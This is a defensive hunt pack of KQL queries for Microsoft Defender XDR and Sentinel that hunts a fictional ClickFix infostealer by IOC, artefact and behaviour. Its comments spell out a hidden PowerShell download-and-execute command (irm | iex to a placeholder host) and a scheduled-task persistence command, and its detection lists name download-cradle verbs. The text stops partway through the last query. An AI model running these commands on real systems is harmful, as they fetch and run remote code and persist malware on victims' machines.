# PASTEJACK infostealer (ClickFix lure) — hunt pack (2026-10-22)

References: threat advisory excerpt "PASTEJACK infostealer campaign" (report.md, observed 2026-10-20, three European customers) · fictional test data, treated as data only · this page is the pack announcement.
Products needed: MDE / Defender XDR Advanced Hunting (H1–H10), Sentinel (S1–S3, plus every H-query unchanged when the Defender XDR connector streams the `Device*` / `Alert*` tables).
Status of every query: **UNTESTED — derived from report, no sample run.** No tenant was touched while writing this page. Run the preflight (§2) before trusting a zero-row result.

## 1. What the report gives us, and how it was decomposed

| # | Report step / "detection opportunity" (quoted) | Tier | Table · ActionType | Query | Noise |
|---|---|---|---|---|---|
| 1 | C2 "uses HTTPS to cdn-updates-check[.]com and telemetry-sync-cloud[.]net (resolving to 203.0.113.45)" | IOC (network) | `DeviceNetworkEvents` · ConnectionSuccess / ConnectionFailed / ConnectionRequest / DnsQueryResponse | H1, S1 | Low |
| 2 | "exfiltrated by HTTP POST to /api/upload on the same hosts with the user agent 'Mozilla/5.0 (compatible; UpdateChecker/1.0)'" | Artefact (static string) | `DeviceNetworkEvents` · HttpConnectionInspected; `CommonSecurityLog` (proxy) | H2, S1 | Low |
| 3 | "writes the payload to %APPDATA%\msbuild\upd.exe (SHA256 9f2c…1e0)" | IOC (hash) | `DeviceFileEvents`, `DeviceProcessEvents`, `DeviceEvents` · any | H3 | Low |
| 4 | same step — the drop folder `%APPDATA%\msbuild\` | Artefact (path) | `DeviceFileEvents` · FileCreated/Modified/Renamed; `DeviceProcessEvents` · ProcessCreated | H4 | Low–Med |
| 5 | Opportunity 1: "conhost.exe launched with --headless spawning powershell.exe with a download cradle" | Behaviour | `DeviceProcessEvents` · ProcessCreated | H5 (→ D1) | Low |
| 6 | Opportunity 2: "Scheduled task creation whose action points into a user's AppData\Roaming path" | Behaviour | `DeviceEvents` · ScheduledTaskCreated | H6 | Medium |
| 7 | Opportunity 2 (process view) — `schtasks /create … /tr "…\AppData\Roaming\…"` | Behaviour | `DeviceProcessEvents` · ProcessCreated | H7 | Medium |
| 8 | Opportunity 3: "Outbound connections from a process in AppData\Roaming to the listed domains/IP" — generalised to *rare* destinations | Behaviour | `DeviceNetworkEvents` · ConnectionSuccess | H1 (`FromRoaming` flag) + H8 | Med–High |
| 9 | Initial access: "pasting a command into the Windows Run dialog" | Behaviour (corroboration) | `DeviceRegistryEvents` · RegistryValueSet (`RunMRU`) | H9 | Low–Med |
| 10 | Product's own detections for any of the above | Vendor-alert view | `AlertInfo` + `AlertEvidence`; `SecurityAlert` | H10, S2 | Low |

### MITRE mapping (technique = the behaviour each predicate asserts, not the data source)

| Query | Technique | Why this one |
|---|---|---|
| H1, S1 | T1071.001 Application Layer Protocol: Web Protocols | predicate asserts contact with the campaign's HTTPS C2 hosts |
| H2, S1 | T1041 Exfiltration Over C2 Channel | predicate asserts the POST `/api/upload` + stealer user agent |
| H3 | T1105 Ingress Tool Transfer | the payload hash appearing on disk / executing is the transferred tool |
| H4 | T1105 + T1036.005 Masquerading: Match Legitimate Name or Location | a PE under a fake `msbuild` folder inside the roaming profile |
| H5, D1 | T1059.001 PowerShell + T1105 (cradle) + T1564.003 Hidden Window (`--headless`, `-w hidden`); context T1204.004 User Execution: Malicious Copy and Paste | predicate asserts a hidden-window PowerShell download-and-execute |
| H6, H7 | T1053.005 Scheduled Task | predicate asserts task creation whose action runs from the roaming profile |
| H8 | T1071.001 (candidate C2) | rare external destinations from roaming-profile processes |
| H9 | T1204.004 User Execution: Malicious Copy and Paste | predicate asserts a shell/cradle typed into the Run dialog |
| H10, S2 | — (vendor alerts carry their own mapping) | |

### IOC table (defanged; refanged inside the queries so they can match telemetry)

| Type | Value | Used by |
|---|---|---|
| domain | cdn-updates-check[.]com | H1, H2, H10, S1, S2 |
| domain | telemetry-sync-cloud[.]net | H1, H2, H10, S1, S2 |
| ipv4 | 203.0.113.45 | H1, H10, S1, S2 |
| sha256 | 9f2c1e0a7b5d4c3e8a1f6b2d0c9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0 (fictional) | H3, H10, S2 |
| path | %APPDATA%\msbuild\upd.exe | H4 (folder tokens only; file name is not anchored) |
| user agent | Mozilla/5.0 (compatible; UpdateChecker/1.0) | H2, S1 (token `UpdateChecker` only) |
| uri | POST /api/upload | H2 (token `upload`, as a flag) |
| task name | "OneDrive Sync Health" | **not anchored** — surfaced as a `OneDriveLookalike` flag in H6/H7; never allow-list or match on it |

Pasting rule: **one block at a time.** Every block repeats its own `let` lines (IOC lists, `TimeFrame`) so it survives copy-paste into a portal; pasting two blocks together redefines `let` names and fails to parse.

## 2. Run today — order and preflight

Order (cheap → expensive): preflight → H10 → H1 → H3 → H5 → H4 → H6 → H7 → H9 → H2 → H8. Set the portal time picker to 30 d or rely on the in-query `TimeFrame`; the report's observation date (2026-10-20) is inside the XDR 30-day interactive window. In Sentinel, raise `TimeFrame` to the table's retention (often 90 d).

### Preflight — know your data (Defender XDR)

Three of the queries depend on sub-event types that are not present in every tenant. A zero here means "no telemetry", not "no attack".

```kql
// PASTEJACK hunt pack preflight. Ref: report.md (2026-10-20). Confirms the ActionTypes H2/H6/H9 rely on exist in this tenant.
// UNTESTED - derived from report, no sample run
union
  (DeviceEvents         | where Timestamp > ago(7d) | where ActionType == "ScheduledTaskCreated"    | summarize Rows = count() | extend Check = "DeviceEvents.ScheduledTaskCreated (H6)"),
  (DeviceNetworkEvents  | where Timestamp > ago(7d) | where ActionType == "HttpConnectionInspected"  | summarize Rows = count() | extend Check = "DeviceNetworkEvents.HttpConnectionInspected (H2, Zeek, sampled)"),
  (DeviceNetworkEvents  | where Timestamp > ago(7d) | where ActionType == "DnsQueryResponse"         | summarize Rows = count() | extend Check = "DeviceNetworkEvents.DnsQueryResponse (H1 DNS branch)"),
  (DeviceRegistryEvents | where Timestamp > ago(7d) | where RegistryKey has "RunMRU"                 | summarize Rows = count() | extend Check = "DeviceRegistryEvents RunMRU (H9)")
| project Check, Rows, Verdict = iff(Rows > 0, "available", "NOT SEEN in 7d - treat that query's zero rows as no coverage")
```

## 3. Tier 1 — network IOC (fast, brittle)

### H1 — Contact with the campaign C2 / exfil hosts (Defender XDR)

```kql
// PASTEJACK H1 - network IOC (tier 1). Ref: "PASTEJACK" advisory excerpt 2026-10-20 (report.md), C2 paragraph + opportunity 3.
// DETECTION STRATEGY: any endpoint that connected to, or resolved, the campaign's C2/exfil infrastructure.
// THE MECHANIC: upd.exe in AppData\Roaming beacons over HTTPS to two domains / one IP and POSTs stolen browser credentials there.
// THE RESILIENCE: none - pure IOC match; infrastructure rotates. The FromRoaming flag carries opportunity 3's process-location signal for triage only.
// DATA: DeviceNetworkEvents / ConnectionSuccess, ConnectionFailed, ConnectionRequest, DnsQueryResponse (Zeek, no process context) - retention assumed 30d (XDR) - sampled: yes (MDE throttles network logging)
// TP LIKELIHOOD WHEN IT FIRES: high (no benign reason to reach these hosts)   COVERAGE CAVEAT: rotated infra, throttled connections, DNS-over-HTTPS, proxied egress (see S1)
// STEP 1: refanged IOC lists   STEP 2: match RemoteUrl / RemoteIP / DNS answer   STEP 3: one row per device + initiating process with context sets
// ANALYST ACTION: every row is an incident candidate - pivot to H4/H5/H6 on DeviceId. FP rate label: Low.
// UNTESTED - derived from report, no sample run
let TimeFrame = 30d;                                                           // XDR interactive retention cap; raise in Sentinel if the mirrored table keeps more
let C2Domains = dynamic(["cdn-updates-check.com", "telemetry-sync-cloud.net"]); // refanged on purpose: a query must be able to match its own evidence
let C2IPs     = dynamic(["203.0.113.45"]);
DeviceNetworkEvents
| where Timestamp > ago(TimeFrame)
| where RemoteUrl has_any (C2Domains)                                            // term match covers every label, so sub-domains match too
    or RemoteIP in (C2IPs)
    or (ActionType == "DnsQueryResponse" and AdditionalFields has_any (C2Domains)) // Zeek DNS rows carry the name in AdditionalFields (string in XDR)
| extend FromRoaming = InitiatingProcessFolderPath has_all ("AppData", "Roaming") // report opportunity 3, as a flag rather than a filter
| summarize Hits = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            Actions = make_set(ActionType, 10), Ports = make_set(RemotePort, 10), Urls = make_set(RemoteUrl, 10),
            (Timestamp, ReportId) = arg_max(Timestamp, ReportId)
    by DeviceId, DeviceName, RemoteIP, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessAccountName, FromRoaming
| sort by FromRoaming desc, Hits desc
| project-reorder DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, FromRoaming, RemoteIP, Urls, Ports, Actions, Hits, FirstSeen, LastSeen, DeviceId, ReportId, Timestamp
```

Blind spots: egress through a proxy shows the proxy IP and often no `RemoteUrl` (cover with S1); DoH hides the DNS branch; MDE network throttling can drop short-lived connections; nothing here survives an infrastructure change.

### H2 — Exfil artefacts: `UpdateChecker` user agent and `POST /api/upload` (Defender XDR)

```kql
// PASTEJACK H2 - static exfil artefact (tier 2). Ref: report.md 2026-10-20, exfiltration sentence.
// DETECTION STRATEGY: HTTP requests carrying the stealer's user agent, and uploads to the stealer's API path, from any device.
// THE MECHANIC: stolen browser credentials are POSTed to /api/upload with "Mozilla/5.0 (compatible; UpdateChecker/1.0)".
// THE RESILIENCE: "UpdateChecker" is the only attacker-chosen token in the UA (the rest is browser boilerplate); it survives an infrastructure rotation but not a rebuild.
// DATA: DeviceNetworkEvents / HttpConnectionInspected (Zeek network inspection) - retention assumed 30d - sampled: YES, and HTTPS bodies/headers are invisible: this only sees cleartext HTTP
// TP LIKELIHOOD WHEN IT FIRES: high   COVERAGE CAVEAT: TLS hides UA and URI; inspection is sampled; devices without network inspection produce nothing (preflight)
// STEP 1: cheap raw-string pre-filter   STEP 2: parse the HTTP fields   STEP 3: attribute to a process via the (LocalIP, RemoteIP, LocalPort, 5 min bin) join, because Zeek rows carry no process
// ANALYST ACTION: KnownC2Host == true is an incident; otherwise check the attributed process path (expect AppData\Roaming) and pivot to H4. FP rate label: Low.
// UNTESTED - derived from report, no sample run
let TimeFrame = 30d;
let ExfilUserAgent = "UpdateChecker";                                           // the invariant token of the UA; the "Mozilla/5.0 (compatible; ...)" part is boilerplate
let ExfilUriToken  = "upload";                                                  // from POST /api/upload; a flag, not a filter, so a renamed path still surfaces by UA
let C2Domains = dynamic(["cdn-updates-check.com", "telemetry-sync-cloud.net"]);
let Inspected = materialize(                                                    // referenced twice below (join left side + device pre-filter)
    DeviceNetworkEvents
    | where Timestamp > ago(TimeFrame)
    | where ActionType == "HttpConnectionInspected"
    | where AdditionalFields has (ExfilUserAgent)                               // string column in XDR: term match before any parsing
    | extend Http = parse_json(AdditionalFields)
    | extend Method = tostring(Http.method), Host = tostring(Http.host), Uri = tostring(Http.uri),
             UserAgent = tostring(Http.user_agent), StatusCode = tostring(Http.status_code)
    | extend KnownC2Host = Host has_any (C2Domains), IsUpload = Method =~ "POST" and Uri has (ExfilUriToken)
    | extend TimeBin = bin(Timestamp, 5m)
    | project Timestamp, ReportId, DeviceId, DeviceName, LocalIP, LocalPort, RemoteIP, RemotePort, TimeBin, Method, Host, Uri, UserAgent, StatusCode, KnownC2Host, IsUpload);
Inspected
| join kind=leftouter (
    DeviceNetworkEvents
    | where Timestamp > ago(TimeFrame)
    | where ActionType == "ConnectionSuccess"
    | where DeviceId in ((Inspected | distinct DeviceId))                        // semi-join pre-filter: only the devices that produced a UA hit
    | project DeviceId, LocalIP, RemoteIP, LocalPort, TimeBin = bin(Timestamp, 5m),
              InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessAccountName
  ) on DeviceId, LocalIP, RemoteIP, LocalPort, TimeBin
| project-away DeviceId1, LocalIP1, RemoteIP1, LocalPort1, TimeBin1
| extend FromRoaming = InitiatingProcessFolderPath has_all ("AppData", "Roaming")
| sort by KnownC2Host desc, IsUpload desc, Timestamp desc
| project-reorder Timestamp, DeviceName, InitiatingProcessAccountName, Method, Host, Uri, UserAgent, StatusCode, KnownC2Host, IsUpload, InitiatingProcessFileName, InitiatingProcessFolderPath, FromRoaming, RemoteIP, DeviceId, ReportId
```

Blind spots: anything over TLS (the report says C2 is HTTPS; the POST is only visible if it is cleartext or at a TLS-terminating proxy — that is S1's job); Zeek inspection sampling; the attribution join is best-effort (several processes can share a 5 min bin to the same remote).

## 4. Tier 2 — static artefacts (hash, path)

### H3 — Payload hash anywhere on the estate (Defender XDR)

```kql
// PASTEJACK H3 - payload hash IOC (tier 1/2). Ref: report.md 2026-10-20, "%APPDATA%\msbuild\upd.exe (SHA256 9f2c...1e0)".
// DETECTION STRATEGY: the exact payload build seen on disk, executed, or flagged by the sensor.
// THE MECHANIC: the downloaded script writes upd.exe to AppData\Roaming\msbuild and runs it via the scheduled task.
// THE RESILIENCE: none - one sample hash; a recompile defeats it. Zero hits means "not this build", not "not this campaign" (use H4/H5 for that).
// DATA: DeviceFileEvents, DeviceProcessEvents, DeviceEvents (AV / attack-surface events also carry SHA256) - retention assumed 30d - sampled: no (DeviceImageLoadEvents deliberately excluded: sampled)
// TP LIKELIHOOD WHEN IT FIRES: high   COVERAGE CAVEAT: hash only; the Indicators blade (block + alert) is the better long-term home for this value
// STEP 1: union the three tables on the exact hash   STEP 2: one row per device with first/last seen and context sets
// ANALYST ACTION: any row is an incident; the FirstSeen writer process (Actors) is the download cradle. FP rate label: Low.
// UNTESTED - derived from report, no sample run
let TimeFrame = 30d;
let PayloadSHA256 = dynamic(["9f2c1e0a7b5d4c3e8a1f6b2d0c9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0"]); // lower-case; MDE stores hashes lower-case
union
  (DeviceFileEvents    | where Timestamp > ago(TimeFrame) | where SHA256 in~ (PayloadSHA256)
     | project Timestamp, ReportId, DeviceId, DeviceName, Table = "DeviceFileEvents", ActionType, FileName, FolderPath, SHA256, Actor = InitiatingProcessFileName, ActorCommandLine = InitiatingProcessCommandLine),
  (DeviceProcessEvents | where Timestamp > ago(TimeFrame) | where SHA256 in~ (PayloadSHA256)
     | project Timestamp, ReportId, DeviceId, DeviceName, Table = "DeviceProcessEvents", ActionType, FileName, FolderPath, SHA256, Actor = InitiatingProcessFileName, ActorCommandLine = InitiatingProcessCommandLine),
  (DeviceEvents        | where Timestamp > ago(TimeFrame) | where SHA256 in~ (PayloadSHA256)
     | project Timestamp, ReportId, DeviceId, DeviceName, Table = "DeviceEvents", ActionType, FileName, FolderPath, SHA256, Actor = InitiatingProcessFileName, ActorCommandLine = InitiatingProcessCommandLine)
| summarize Events = count(), LastSeen = max(Timestamp), Tables = make_set(Table, 5), Actions = make_set(ActionType, 10),
            Paths = make_set(FolderPath, 10), Actors = make_set(Actor, 10), ActorCommandLines = make_set(ActorCommandLine, 5),
            (Timestamp, ReportId) = arg_min(Timestamp, ReportId)                // first sighting is the one to alert on
    by DeviceId, DeviceName, SHA256
| project-reorder DeviceName, Timestamp, LastSeen, Events, Tables, Actions, Paths, Actors, ActorCommandLines, SHA256, DeviceId, ReportId
```

Blind spots: a rebuilt payload; files that never produced a file/process event (dropped and deleted between sensor scans). XDR-only option, not for Sentinel: `| invoke FileProfile(SHA1, 1000)` is unnecessary here because the hash is already known.

### H4 — Executable written to or run from `AppData\Roaming\msbuild\` (Defender XDR)

```kql
// PASTEJACK H4 - drop-folder artefact (tier 2). Ref: report.md 2026-10-20, "%APPDATA%\msbuild\upd.exe" + opportunity 2's path.
// DETECTION STRATEGY: a PE created in, or executed from, a folder named msbuild inside the roaming profile - real MSBuild never lives under a user profile.
// THE MECHANIC: the PowerShell cradle writes upd.exe into %APPDATA%\msbuild and the ONLOGON task runs it from there.
// THE RESILIENCE: the file name is NOT anchored (upd.exe is trivially renamed); the folder tokens are the artefact. Drop "msbuild" from the token list to widen to "any PE from Roaming" (noisy - see BTP list).
// DATA: DeviceFileEvents / FileCreated, FileModified, FileRenamed; DeviceProcessEvents / ProcessCreated - retention assumed 30d - sampled: no
// TP LIKELIHOOD WHEN IT FIRES: high with "msbuild" in the tokens; medium without   COVERAGE CAVEAT: a different folder name or a DLL side-load is only caught by the widened form
// STEP 1: union writes + executions   STEP 2: normalise the user segment of the path   STEP 3: fleet prevalence per normalised path with a population filter
// ANALYST ACTION: Devices <= MaxDevices rows: check Actors (expect powershell.exe writing, svchost/taskeng-launched execution) and Hashes; pivot to H3 with any new hash. FP rate label: Low (narrow) / Medium (widened).
// UNTESTED - derived from report, no sample run
let TimeFrame = 30d;
let ArtefactFolderTokens = dynamic(["Roaming", "msbuild"]);                     // the campaign drop folder; widen by removing "msbuild"
let MaxDevices = 5;                                                             // population filter: a path on more devices is probably a deployed tool - FP it trades: a fleet-wide compromise would look normal
union
  (DeviceFileEvents
     | where Timestamp > ago(TimeFrame)
     | where ActionType in ("FileCreated", "FileModified", "FileRenamed")
     | where FolderPath has_all (ArtefactFolderTokens)
     | where FileName endswith ".exe" or FileName endswith ".dll"
     | project Timestamp, ReportId, DeviceId, DeviceName, Kind = "write", ActionType, FileName, FolderPath, SHA256,
               Actor = InitiatingProcessFileName, ActorCommandLine = InitiatingProcessCommandLine, Account = InitiatingProcessAccountName),
  (DeviceProcessEvents
     | where Timestamp > ago(TimeFrame)
     | where ActionType == "ProcessCreated"
     | where FolderPath has_all (ArtefactFolderTokens)
     | project Timestamp, ReportId, DeviceId, DeviceName, Kind = "exec", ActionType, FileName, FolderPath, SHA256,
               Actor = InitiatingProcessFileName, ActorCommandLine = InitiatingProcessCommandLine, Account = AccountName)
| extend NormPath = replace_regex(tolower(FolderPath), @'\\users\\[^\\]+\\', @'\\users\\<user>\\')  // lint:ignore W014 - normalisation token, not a placeholder
| summarize Devices = dcount(DeviceId), Events = count(), Kinds = make_set(Kind, 2), FileNames = make_set(FileName, 10),
            Hashes = make_set(SHA256, 10), Actors = make_set(Actor, 10), ActorCommandLines = make_set(ActorCommandLine, 5),
            Accounts = make_set(Account, 10), DeviceNames = make_set(DeviceName, 20), LastSeen = max(Timestamp),
            (Timestamp, ReportId, DeviceId, DeviceName) = arg_min(Timestamp, ReportId, DeviceId, DeviceName)
    by NormPath
| where Devices <= MaxDevices
| sort by Devices asc, Events desc
| project-reorder NormPath, Devices, DeviceNames, Kinds, FileNames, Actors, ActorCommandLines, Accounts, Hashes, Timestamp, LastSeen, DeviceId, DeviceName, ReportId
```

Blind spots: the widened form (no `msbuild`) will list legitimate roaming-profile residents — known BTP generators: Spotify, Zoom (`Roaming\Zoom\bin`), Telegram Desktop, uTorrent, some KeePass plugins; exclude them by normalised folder **and** signer, never by file name. `AppData\Local` droppers are out of scope by design (token is `Roaming`).

## 5. Tier 3 — behaviour (survives infrastructure and hash changes)

### H5 — Headless `conhost.exe` spawning a PowerShell download cradle (Defender XDR)

Quoted opportunity 1: *"conhost.exe launched with --headless spawning powershell.exe with a download cradle."*

```kql
// PASTEJACK H5 - behaviour (tier 3). Ref: report.md 2026-10-20, opportunity 1 and the pasted Run-dialog command.
// DETECTION STRATEGY: PowerShell started by a headless conhost (the ClickFix "hide the window" trick) whose command line fetches remote content.
// THE MECHANIC: victim pastes "conhost.exe --headless powershell.exe -w hidden -c "irm https://<host>/v.txt | iex"" into Win+R; conhost --headless gives a console-less child, -w hidden hides the shell, irm|iex is the cradle.
// THE RESILIENCE: anchored on child FileName + parent FileName + the "headless" token; the cradle is matched on 2-4 unordered invariant tokens (fetch verb, exec verb) so URL, host, path, ordering and quoting can all change. Encoded command lines are decoded and matched too.
// DATA: DeviceProcessEvents / ProcessCreated - retention assumed 30d - sampled: no
// TP LIKELIHOOD WHEN IT FIRES: high (no admin tooling uses conhost --headless + a cradle)   COVERAGE CAVEAT: ClickFix variants without the conhost wrapper (explorer.exe -> powershell.exe directly, mshta, msiexec, curl.exe) are NOT matched - see ANALYST ACTION and H9
// STEP 1: anchor on process + parent + headless token   STEP 2: canonicalise, decode base64   STEP 3: unordered token match, score, rank
// ANALYST ACTION: Score >= 2 is an incident; InitiatingProcessParentFileName == explorer.exe confirms the Run-dialog path. To widen: drop the two InitiatingProcess* filters (every PowerShell cradle, noisier) or replace ShellNames with ("mshta.exe","msiexec.exe","curl.exe","cmd.exe"). FP rate label: Low.
// UNTESTED - derived from report, no sample run (fixture in section 8 is the report sample)
let TimeFrame = 30d;
let ShellNames  = dynamic(["powershell.exe", "pwsh.exe", "powershell_ise.exe"]);
let CradleFetch = dynamic(["irm", "iwr", "Invoke-RestMethod", "Invoke-WebRequest", "DownloadString", "DownloadFile", "DownloadData", "WebClient", "WebRequest", "Start-BitsTransfer", "curl", "wget"]); // irm/iwr are the aliases in the sample: exact term match on an already FileName-anchored set, so the un-indexed 3-char terms cost nothing
let CradleExec  = dynamic(["iex", "Invoke-Expression", "Invoke-Command"]);
DeviceProcessEvents
| where Timestamp > ago(TimeFrame)
| where ActionType == "ProcessCreated"                                          // DeviceProcessEvents carries other ActionTypes now
| where FileName in~ (ShellNames)
| where InitiatingProcessFileName =~ "conhost.exe"
| where InitiatingProcessCommandLine has "headless"                            // the token behind "--headless"; a normal console host never carries it
| extend Canon = replace_string(ProcessCommandLine, '"', '')
| extend IsEncoded = Canon contains "-enc" or Canon has "EncodedCommand"
| extend Encoded = extract(@'\s+([A-Za-z0-9+/]{20}\S+$)', 1, Canon)
| extend Decoded = iff(IsEncoded and isnotempty(Encoded), replace_string(base64_decode_tostring(Encoded), "\u0000", ""), "")
| extend HasFetch = Canon has_any (CradleFetch) or Decoded has_any (CradleFetch)
| extend HasExec  = Canon has_any (CradleExec)  or Decoded has_any (CradleExec)
| where HasFetch or IsEncoded                                                   // encoded + headless conhost is worth a look even before decoding
| extend Score = toint(HasFetch) + toint(HasExec) + toint(IsEncoded) + toint(Canon has "hidden")
| project Timestamp, DeviceName, AccountName, Score, HasFetch, HasExec, IsEncoded, ProcessCommandLine, Decoded,
          InitiatingProcessCommandLine, InitiatingProcessParentFileName, DeviceId, ReportId, SHA256, ProcessId, InitiatingProcessId
| sort by Score desc, Timestamp desc
```

Blind spots: cradles in other binaries (mshta/msiexec/curl/certutil/bitsadmin); a `-File` pointing at an already-dropped script; `pwsh` renamed (anchor is `FileName`, so use `ProcessVersionInfoOriginalFileName` if that matters to your threat model); cradle verbs not in the list (`Net.Sockets`, `[IO.File]`); the headless token spelled through a shim.

### H6 — Scheduled task whose action runs from `AppData\Roaming` (Defender XDR)

Quoted opportunity 2: *"Scheduled task creation whose action points into a user's AppData\Roaming path."*

```kql
// PASTEJACK H6 - behaviour (tier 3). Ref: report.md 2026-10-20, opportunity 2 and the schtasks sample.
// DETECTION STRATEGY: a scheduled task is registered whose Exec action lives in a roaming profile - persistence for an unprivileged user.
// THE MECHANIC: schtasks /create /sc ONLOGON /tn "OneDrive Sync Health" /tr "C:\Users\<user>\AppData\Roaming\msbuild\upd.exe" /f
// THE RESILIENCE: keyed on the task's ACTION path, so it also catches tasks registered through the COM/PowerShell API (no schtasks.exe process) and any task name. The task name is surfaced as a flag only.
// DATA: DeviceEvents / ScheduledTaskCreated (AdditionalFields.TaskName, .TaskContent XML) - retention assumed 30d - sampled: no - presence varies per tenant (preflight)
// TP LIKELIHOOD WHEN IT FIRES: medium (a few vendors install into Roaming)   COVERAGE CAVEAT: tasks whose action is %LOCALAPPDATA% or a system path; tasks created via Run keys / WMI instead
// STEP 1: raw-string pre-filter   STEP 2: parse TaskName / TaskContent, pull the Exec action   STEP 3: normalise, prevalence per action path, population filter
// ANALYST ACTION: Devices <= MaxDevicesPerAction rows with LogonTrigger == true and an unsigned / unknown action path are incidents; OneDriveLookalike == true is the report's exact lure. Allow-list by path + signer only. FP rate label: Medium.
// UNTESTED - derived from report, no sample run (parse_xml field path is the documented Task XML shape; the extract() fallback covers a different shape)
let TimeFrame = 30d;
let MaxDevicesPerAction = 5;                                                    // population filter - FP it trades: a company-wide deployment of a roaming-profile tool is hidden, as is a fleet-wide compromise
let KnownBenignActionPaths = dynamic([]);                                       // normalised, lower-case folder fragments reviewed as BTP, e.g. "\\appdata\\roaming\\zoom\\bin\\" - key on path (+ signer after review), NEVER on task name: the actor names tasks after OneDrive
DeviceEvents
| where Timestamp > ago(TimeFrame)
| where ActionType == "ScheduledTaskCreated"
| where AdditionalFields has "Roaming" or AdditionalFields contains "%APPDATA%"  // cheap pre-filter on the raw string; %APPDATA% expands to Roaming
| extend AF = parse_json(AdditionalFields)
| extend TaskName = tostring(AF.TaskName), TaskContent = tostring(AF.TaskContent)
| extend TaskXml = parse_xml(TaskContent)
| extend ActionCommand = tostring(TaskXml.Task.Actions.Exec.Command), ActionArgs = tostring(TaskXml.Task.Actions.Exec.Arguments)
| extend ActionCommand = iff(isempty(ActionCommand), extract(@'<Command>([^<]+)</Command>', 1, TaskContent), ActionCommand)
| extend ActionLine = strcat(ActionCommand, " ", ActionArgs)
| where ActionLine has "Roaming" or ActionLine contains "%APPDATA%"              // the ACTION points into Roaming, not merely some author/description field
| extend NormAction = replace_regex(tolower(ActionCommand), @'\\users\\[^\\]+\\', @'\\users\\<user>\\')  // lint:ignore W014 - normalisation token, not a placeholder
| where array_length(KnownBenignActionPaths) == 0 or not(NormAction has_any (KnownBenignActionPaths))
| extend LogonTrigger = TaskContent has_any ("LogonTrigger", "BootTrigger"), OneDriveLookalike = TaskName has "OneDrive"
| summarize Devices = dcount(DeviceId), Tasks = count(), TaskNames = make_set(TaskName, 10), DeviceNames = make_set(DeviceName, 20),
            Creators = make_set(InitiatingProcessFileName, 10), CreatorCommandLines = make_set(InitiatingProcessCommandLine, 5),
            Accounts = make_set(InitiatingProcessAccountName, 10), LogonTrigger = max(LogonTrigger), OneDriveLookalike = max(OneDriveLookalike),
            Args = make_set(ActionArgs, 5), LastSeen = max(Timestamp),
            (Timestamp, ReportId, DeviceId, DeviceName) = arg_min(Timestamp, ReportId, DeviceId, DeviceName)
    by NormAction
| where Devices <= MaxDevicesPerAction
| sort by OneDriveLookalike desc, LogonTrigger desc, Devices asc
| project-reorder NormAction, Args, TaskNames, OneDriveLookalike, LogonTrigger, Devices, DeviceNames, Creators, CreatorCommandLines, Accounts, Timestamp, LastSeen, DeviceId, DeviceName, ReportId
```

Blind spots: `%LOCALAPPDATA%` / `AppData\Local` actions (widen the two `has "Roaming"` lines to `has "AppData"`); persistence via Run keys, WMI subscriptions or startup folder; tenants without `ScheduledTaskCreated` (use H7). Known BTP generator from the skill's taxonomy: the OneDrive updater creates AppData tasks — it lives in `AppData\Local\Microsoft\OneDrive`, so it is excluded by the `Roaming` token, and a task *named* OneDrive pointing at `Roaming` is exactly the lure.

### H7 — `schtasks.exe /create` with an action in `AppData\Roaming` (Defender XDR)

```kql
// PASTEJACK H7 - behaviour, process view of opportunity 2 (tier 3). Ref: report.md 2026-10-20, schtasks sample.
// DETECTION STRATEGY: schtasks.exe registers a task whose /tr action runs from a roaming profile.
// THE MECHANIC: schtasks /create /sc ONLOGON /tn "OneDrive Sync Health" /tr "C:\Users\<user>\AppData\Roaming\msbuild\upd.exe" /f
// THE RESILIENCE: FileName-anchored + two invariant tokens ("create", "Roaming" or %APPDATA%); task name, trigger, /f and ordering are free. Complements H6 for tenants without ScheduledTaskCreated and shows WHO ran schtasks (expect powershell.exe or the dropped PE).
// DATA: DeviceProcessEvents / ProcessCreated - retention assumed 30d - sampled: no
// TP LIKELIHOOD WHEN IT FIRES: medium   COVERAGE CAVEAT: tasks created via API/COM/PowerShell cmdlets never spawn schtasks.exe (H6 covers those); /tr pointing at %LOCALAPPDATA%
// STEP 1: anchor + tokens   STEP 2: parse_command_line to pull /tn /tr /sc by flag name (not by position)   STEP 3: normalise, prevalence per action path
// ANALYST ACTION: ActorFromRoaming == true or LogonTrigger == true with a rare NormRun is an incident; OneDriveLookalike is the exact lure. FP rate label: Medium (software installers running as the user).
// UNTESTED - derived from report, no sample run (fixture in section 8 is the report sample)
let TimeFrame = 30d;
let MaxDevicesPerAction = 5;                                                    // population filter - same trade-off as H6
DeviceProcessEvents
| where Timestamp > ago(TimeFrame)
| where ActionType == "ProcessCreated"
| where FileName =~ "schtasks.exe"
| extend Canon = replace_string(ProcessCommandLine, '"', '')
| where Canon has "create"                                                      // the token behind /create (and /Create, -create)
| where Canon has "Roaming" or Canon contains "%APPDATA%"
| extend Args = parse_command_line(ProcessCommandLine, "windows"), ArgsLower = parse_command_line(tolower(ProcessCommandLine), "windows")
| extend TnIdx = array_index_of(ArgsLower, "/tn"), TrIdx = array_index_of(ArgsLower, "/tr"), ScIdx = array_index_of(ArgsLower, "/sc")
| extend TaskName = iff(TnIdx >= 0, tostring(Args[TnIdx + 1]), ""),
         TaskRun  = iff(TrIdx >= 0, tostring(Args[TrIdx + 1]), ""),
         Schedule = iff(ScIdx >= 0, tostring(Args[ScIdx + 1]), "")
| extend NormRun = replace_regex(tolower(TaskRun), @'\\users\\[^\\]+\\', @'\\users\\<user>\\')  // lint:ignore W014 - normalisation token, not a placeholder
| extend LogonTrigger = Schedule in~ ("onlogon", "onstart"), OneDriveLookalike = TaskName has "OneDrive",
         ActorFromRoaming = InitiatingProcessFolderPath has_all ("AppData", "Roaming")
| summarize Devices = dcount(DeviceId), Events = count(), TaskNames = make_set(TaskName, 10), Schedules = make_set(Schedule, 5),
            DeviceNames = make_set(DeviceName, 20), Accounts = make_set(AccountName, 10),
            Actors = make_set(InitiatingProcessFileName, 10), ActorFolders = make_set(InitiatingProcessFolderPath, 10),
            LogonTrigger = max(LogonTrigger), OneDriveLookalike = max(OneDriveLookalike), ActorFromRoaming = max(ActorFromRoaming),
            CommandLines = make_set(ProcessCommandLine, 5), LastSeen = max(Timestamp),
            (Timestamp, ReportId, DeviceId, DeviceName) = arg_min(Timestamp, ReportId, DeviceId, DeviceName)
    by NormRun
